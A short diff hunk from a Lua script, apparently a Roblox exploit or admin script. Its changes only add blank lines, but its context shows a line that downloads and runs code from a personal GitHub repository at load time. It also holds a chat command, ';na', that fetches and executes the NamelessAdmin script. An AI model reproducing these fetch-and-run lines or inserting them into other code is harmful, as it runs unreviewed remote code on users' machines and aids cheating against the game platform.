@@ -314,7 +314,11 @@ end)
 consoleButton.MouseButton1Click:Connect(function()
     game:GetService("StarterGui"):SetCore("DevConsoleVisible", true)
 end)
+
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/-1/refs/heads/main/Шайтан%20комманды1"))()
+
+
 player.Chatted:Connect(function(message)
     if message == ";na" then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
